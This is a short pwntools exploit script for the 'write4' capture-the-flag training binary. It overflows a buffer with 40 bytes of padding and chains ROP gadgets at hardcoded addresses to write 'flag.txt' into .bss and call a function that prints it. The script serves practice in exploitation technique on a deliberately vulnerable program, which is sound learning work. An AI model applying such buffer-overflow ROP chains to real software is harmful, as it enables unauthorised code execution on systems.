import sys
from pwn import *

fpath = './write4'
if 'debug' in sys.argv:
    gdb.debug(fpath)
else:
    p = process(fpath)

popregs = p64(0x400690)
movregs = p64(0x400628)
poprdi  = p64(0x400693)
useful  = p64(0x400620)
bssloc  = p64(0x601038)

padding  = b'A' * 40
payload  = padding
payload += popregs
payload += bssloc
payload += b'flag.txt'
payload += movregs
payload += poprdi
payload += bssloc
payload += useful

with open('payload.bin', 'wb') as f:
    f.write(payload)

p.recvuntil(b'> ')
p.send(payload)
resp = p.recvall()

print(resp)
